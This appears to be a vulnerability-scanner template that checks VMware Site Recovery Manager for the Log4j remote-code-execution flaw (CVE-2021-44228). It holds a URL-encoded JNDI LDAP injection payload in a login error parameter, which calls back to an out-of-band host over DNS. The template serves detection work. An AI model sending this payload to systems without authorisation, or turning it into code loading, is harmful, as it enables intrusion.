id: vmware-siterecovery-log4j-rce
brief:
    title: VMware Site Recovery Manager - Remote Code Execution (Apache Log4j)
    by: akincibor
    level: critical
    about: VMware Site Recovery Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full con...
    label:
        - cve
        - cve2021
        - jndi
        - log4j
        - rce
        - oast
        - vmware
        - siterecovery
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/dr/authentication/oauth2/oauth2login?error=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.uri.{{interactsh-url}}%7D'
      signs:
        - "on": word
          has:
            - <title>Error - Site Recovery</title>
          in: body
          need: all
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
